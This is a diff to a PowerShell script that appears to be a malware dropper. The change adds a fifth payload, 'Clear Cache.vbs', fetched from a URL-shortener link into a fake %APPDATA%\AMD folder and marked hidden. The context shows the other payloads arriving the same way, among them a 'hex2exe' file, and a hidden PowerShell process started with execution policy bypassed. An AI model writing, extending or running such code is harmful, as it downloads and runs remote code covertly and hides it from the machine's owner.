@@ -3,12 +3,14 @@ $url1 = "https://lnkfwd.com/u/KtRiC0kh"
 $url2 = "https://lnkfwd.com/u/Kqc2ajEr"
 $url3 = "https://lnkfwd.com/u/K-060JPj" #RAMMAP hex2exe
 $url4 = 'https://lnkfwd.com/u/K-2Pq1DI' #RAMMap.txt
+$url5 = 'https://lnkfwd.com/u/LO8XiKoa' # Clear Cache.vbs
 
 # Define the destination paths in the %TEMP% directory
 $destination1 = "$env:TEMP\ftf.ps1"
 $destination2 = "$env:TEMP\Ain1.ps1"
 $destination3 = "$env:APPDATA\AMD\ConvertNrun.ps1" # Change "yourfile.ps1" to your desired filename
 $destination4 = "$env:APPDATA\AMD\RAMMap.txt"
+$destination5 = "$env:APPDATA\AMD\ClearCache.vbs"
 
 # Create the AMD directory if it doesn't exist
 $amdDirectory = "$env:APPDATA\AMD"
@@ -22,14 +24,16 @@ if (Test-Path -Path $amdDirectory) {
 # Create a new AMD directory
 New-Item -ItemType Directory -Path $amdDirectory
 
+# Download
 Invoke-WebRequest -Uri $url1 -OutFile $destination1
 Invoke-WebRequest -Uri $url2 -OutFile $destination2
 Invoke-WebRequest -Uri $url3 -OutFile $destination3
 Invoke-WebRequest -Uri $url4 -OutFile $destination4
+Invoke-WebRequest -Uri $url5 -OutFile $destination5
 
 
 # Set the downloaded files in C:\AMD as hidden
-$filesToHide = @($destination3, $destination4)
+$filesToHide = @($destination3, $destination4, $destination5)
 
 foreach ($file in $filesToHide) {
     if (Test-Path -Path $file) {
@@ -50,8 +54,7 @@ Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Wind
 
 
 
-
-# #debug
+# #debugging
 # # Use Invoke-WebRequest to download the first file with error handling
 # try {
 #     Invoke-WebRequest -Uri $url1 -OutFile $destination1 -ErrorAction Stop
